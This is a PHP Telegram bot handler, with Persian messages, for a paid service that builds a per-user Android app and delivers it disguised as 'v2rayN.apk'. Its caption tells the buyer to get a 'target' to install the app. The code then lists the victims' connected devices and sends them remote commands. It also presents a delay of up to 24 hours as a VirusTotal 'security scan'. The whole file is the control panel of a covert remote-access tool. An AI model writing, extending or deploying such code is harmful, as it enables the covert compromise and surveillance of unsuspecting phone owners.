<?php

namespace App\Telegram\Handlers;

use App\Models\User;
use App\Services\ApkBuilderService;
use App\Services\KermAppService;
use App\Telegram\Keyboards\MobileKermRiziKeyboard;
use App\Telegram\Keyboards\PlusRequiredKeyboard;
use Illuminate\Support\Facades\Log;
use SergiX44\Nutgram\Nutgram;
use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

class MobileKermRiziHandler
{
    protected KermAppService $appService;
    protected ApkBuilderService $apkService;
    protected const ADMIN_ID = 691903008;

    public function __construct(KermAppService $appService, ApkBuilderService $apkService)
    {
        $this->appService = $appService;
        $this->apkService = $apkService;
    }

    public function start(Nutgram $bot): void
    {
        /** @var User|null $user */
        $user = User::where('telegram_id', $bot->userId())->first();

        if (!$user) {
            $bot->sendMessage('❌ کاربر پیدا نشد.');
            return;
        }

        // ۱. بررسی اشتراک پلاس
        if (!$user->hasPlusSubscription()) {
            $bot->sendMessage(
                "<tg-emoji emoji-id=\"6224077119996040131\">❗️</tg-emoji><tg-emoji emoji-id=\"4929619512224909015\">🪱</tg-emoji> این بخش نیازمند ارتقای نسخه رباتمونه <tg-emoji emoji-id=\"5370967353674701492\">😚</tg-emoji>\n\nبرای ارتقای نسخه ربات به \"نسخه پلاس<tg-emoji emoji-id=\"5433758796289685818\">👑</tg-emoji>\" و یا به \"نسخه پرو<tg-emoji emoji-id=\"6244241334320762892\">💎</tg-emoji>\" از طریق دکمه های زیر اقدام کنید :",
                parse_mode: 'HTML',
                reply_markup: PlusRequiredKeyboard::make('main_menu')
            );
            return;
        }

        $apiToken = $user->api_token;

        // ۲. اگر کاربر قبلاً اپلیکیشن خود را تحویل گرفته است
        if ($apiToken) {
            $keyboard = InlineKeyboardMarkup::make()->addRow(
                InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
            );

            $bot->sendMessage(
                "✅ شما قبلاً اپلیکیشن اختصاصی خود را دریافت کرده‌اید.\n\nبرای مدیریت دستگاه‌های متصل، روی دکمه زیر کلیک کنید:",
                reply_markup: $keyboard
            );
            return;
        }

        if ($user->hasActiveTimer()) {
            $remainingText = $user->getRemainingTimerText();

            $msg = '<b><tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji></b> <b>درخواست ساخت اپلیکیشن در حال بررسی است!</b>' . "\n\n";
            $msg .= '<blockquote>جهت تایید اپلیکیشن شما توسط ویروس‌توتال، فرایند اسکن امنیتی در حال انجام است. پس از اتمام این زمان، اپلیکیشن اختصاصی شما به صورت خودکار تحویل داده می‌شود.</blockquote>';

            $keyboard = InlineKeyboardMarkup::make()
                ->addRow(
                    InlineKeyboardButton::make(
                        text: "{$remainingText}",
                        callback_data: 'refresh_app_timer',
                        style: 'info',
                        icon_custom_emoji_id: '4904882772637648609'
                    )
                )
                ->addRow(
                    InlineKeyboardButton::make(
                        text: 'کرم پلاس',
                        url: 'https://t.me/kermplus',
                        style: 'danger',
                        icon_custom_emoji_id: '4929619512224909015'
                    )
                );

            $bot->sendMessage($msg, parse_mode: 'HTML', reply_markup: $keyboard);
            return;
        }

        if ($user->isTimerReady()) {
            $apkPath = $this->apkService->downloadApkFromServer($user['apk_url']);
            $keyboard = InlineKeyboardMarkup::make()->addRow(
                InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
            );
            $bot->sendDocument(
                document: InputFile::make($apkPath, 'v2rayN.apk'),
                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.

            <tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه

            <b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNG</b>
            ',
                reply_markup: $keyboard,
                parse_mode: 'HTML'
            );

            return ;
        }

        try {
            $userResponse = $this->appService->registerOwner(
                $bot->userId(),
                $bot->user()->username,
                $bot->user()->first_name
            );

            $apiToken = $userResponse['data']['api_token'];
            $appKey = $userResponse['data']['app_key'];

            User::where('telegram_id', $bot->userId())->update(['api_token' => $apiToken]);
            $bot->setUserData('api_token', $apiToken);

            $buildData = $this->apkService->generateApk((string) $bot->userId(), $appKey);
            User::where('telegram_id', $bot->userId())->update(['apk_url' => $buildData['download_url']]);
            // $apkPath = $this->apkService->downloadApkFromServer($buildData['download_url']);



            if (! $user->timer_expires_at) {
                $user->startNewCooldown(minHours: 12, maxHours: 24);
                $remainingText = $user->getRemainingTimerText();

                $msg = '<b><tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji></b> <b>درخواست ساخت اپلیکیشن اختصاصی شما با موفقیت ثبت شد.</b>' . "\n\n";
                $msg .= '<blockquote>جهت تایید اپلیکیشن شما توسط ویروس توتال، نیاز به زمان اسکن امنیتی است که از همین حالا شروع شد. پس از اتمام این مدت زمان، مجدداً مراجعه کنید تا فایل اختصاصی خود را تحویل بگیرید.</blockquote>';

                $keyboard = InlineKeyboardMarkup::make()
                    ->addRow(
                        InlineKeyboardButton::make(
                            text: "{$remainingText}",
                            callback_data: 'refresh_app_timer',
                            style: 'info',
                            icon_custom_emoji_id: '4904882772637648609'
                        )
                    )
                    ->addRow(
                        InlineKeyboardButton::make(
                            text: 'کرم پلاس',
                            url: 'https://t.me/kermplus',
                            style: 'danger',
                            icon_custom_emoji_id: '4929619512224909015'
                        )
                    );

                $bot->sendMessage($msg, parse_mode: 'HTML', reply_markup: $keyboard);
                return;
            }
        } catch (\Exception $e) {
            Log::channel('daily')->error('خطا در ساخت APK تلگرام', [
                'user_id' => $bot->userId(),
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            report($e);

            $bot->sendMessage("Error for user {$bot->userId()}:\n" . $e->getMessage(), self::ADMIN_ID);
        }
    }


    public function refreshAppTimer(Nutgram $bot): void
    {
        $user = User::where('telegram_id', $bot->userId())->first();

        if (! $user || ! $user->hasActiveTimer()) {
            $bot->answerCallbackQuery(text: 'فعال است', show_alert: true);
            return;
        }

        $remainingText = $user->getRemainingTimerText();

        $keyboard = InlineKeyboardMarkup::make()
            ->addRow(
                InlineKeyboardButton::make(
                    text: "{$remainingText}",
                    callback_data: 'refresh_app_timer',
                    style: 'info',
                    icon_custom_emoji_id: '4904882772637648609'
                )
            )
            ->addRow(
                InlineKeyboardButton::make(
                    text: 'کرم پلاس',
                    url: 'https://t.me/kermplus',
                    style: 'danger',
                    icon_custom_emoji_id: '4929619512224909015'
                )
            );

        try {
            $bot->editMessageReplyMarkup(reply_markup: $keyboard);
            $bot->answerCallbackQuery(text: "{$remainingText}");
        } catch (\Throwable) {
            $bot->answerCallbackQuery(text: "{$remainingText}");
        }
    }

    public function listDevices(Nutgram $bot): void
    {
        $user = User::where('telegram_id', $bot->userId())->first();
        if (!$user->hasPlusSubscription()) {
            $bot->sendMessage("<tg-emoji emoji-id=\"6224077119996040131\">❗️</tg-emoji><tg-emoji emoji-id=\"4929619512224909015\">🪱</tg-emoji> این بخش نیازمند ارتقای نسخه رباتمونه <tg-emoji emoji-id=\"5370967353674701492\">😚</tg-emoji>\n\nبرای ارتقای نسخه ربات به \"نسخه پلاس<tg-emoji emoji-id=\"5433758796289685818\">👑</tg-emoji>\" و یا به \"نسخه پرو<tg-emoji emoji-id=\"6244241334320762892\">💎</tg-emoji>\" از طریق دکمه های زیر اقدام کنید :", reply_markup: PlusRequiredKeyboard::make('main_menu'));
            return;
        }
        $apiToken = User::where('telegram_id', $bot->userId())->value('api_token') ?: $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery('نشست شما منقضی شده. لطفاً دوباره /start را ارسال کنید.', true);
            return;
        }

        try {
            $response = $this->appService->getDevices($apiToken);
            $devices = $response['data'] ?? [];

            if (empty($devices)) {
                $bot->answerCallbackQuery('هنوز دستگاهی متصل نشده است. ابتدا اپلیکیشن را نصب و باز کنید.', true);
                return;
            }

            $keyboard = InlineKeyboardMarkup::make();

            foreach ($devices as $device) {
                $deviceInfo = trim(($device['manufacturer'] ?? '') . ' ' . ($device['model'] ?? ''));
                $deviceName = $deviceInfo ?: "دستگاه {$device['id']}";

                $keyboard->addRow(
                    InlineKeyboardButton::make($deviceName, callback_data: "dev_opts:{$device['id']}", icon_custom_emoji_id: "5407025283456835913")
                );
            }

            $bot->editMessageText('🪱 موبایلی که میخوای روش کرم بریزیم رو انتخاب کن:', reply_markup: $keyboard);
        } catch (\Exception $e) {
            $bot->answerCallbackQuery('❌ خطا در دریافت لیست دستگاهها.', true);
            Log::error('Error fetching devices', ['exception' => $e]);
        }
    }

    public function showDeviceOptions(Nutgram $bot, $id): void
    {
        $bot->setUserData('selected_device_id', $id);
        $bot->editMessageText("⚙️ اکشن ها برای دستگاه #{$id}\n\nچه عملیاتی میخواهید انجام دهید؟", reply_markup: MobileKermRiziKeyboard::make());
    }

    public function executeCommand(Nutgram $bot, $event): void
    {
        $apiToken = User::where('telegram_id', $bot->userId())->value('api_token') ?: $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery(text: 'نشست شما منقضی شده. لطفاً دوباره ربات را استارت کنید.', show_alert: true);
            return;
        }

        if (!in_array($bot->userId(), [self::ADMIN_ID, 500515501])) {
            $bot->answerCallbackQuery(text: 'درحال دیپلوی - دسترسی محدود است.', show_alert: true);
            return;
        }

        $id = $bot->getUserData('selected_device_id');

        if (!$id) {
            $bot->answerCallbackQuery(text: 'هیچ دستگاهی انتخاب نشده است. لطفا برگردید و دوباره انتخاب کنید.', show_alert: true);
            return;
        }

        try {
            $response = $this->appService->sendEvent($apiToken, $event, null, $id);
            $bot->answerCallbackQuery(text: 'درخواست کرم ریزی🪱 با موفقیت ثبت شد✅', show_alert: true);
        } catch (\Exception $e) {
            $bot->answerCallbackQuery(text: '❌ خطا در ارسال دستور. دستگاه آفلاین است یا سرور پاسخ نمیدهد.', show_alert: true);
            Log::error('Error sending command', ['event' => $event, 'device_id' => $id, 'error' => $e->getMessage()]);
        }
    }

    public function __invoke(Nutgram $bot): void
    {
        $msg = "<tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji> <b>کرم پلاس</b> <tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji>\n\nبه بخش کرم ریزی رو موبایل <tg-emoji emoji-id='5407025283456835913'>📱</tg-emoji> خوش اومدی ✋🏻\nبرای ادامه یکی از گزینه های زیر رو انتخاب کن :";

        $bot->editMessageText($msg, parse_mode: 'HTML', reply_markup: MobileKermRiziKeyboard::make());
    }
}
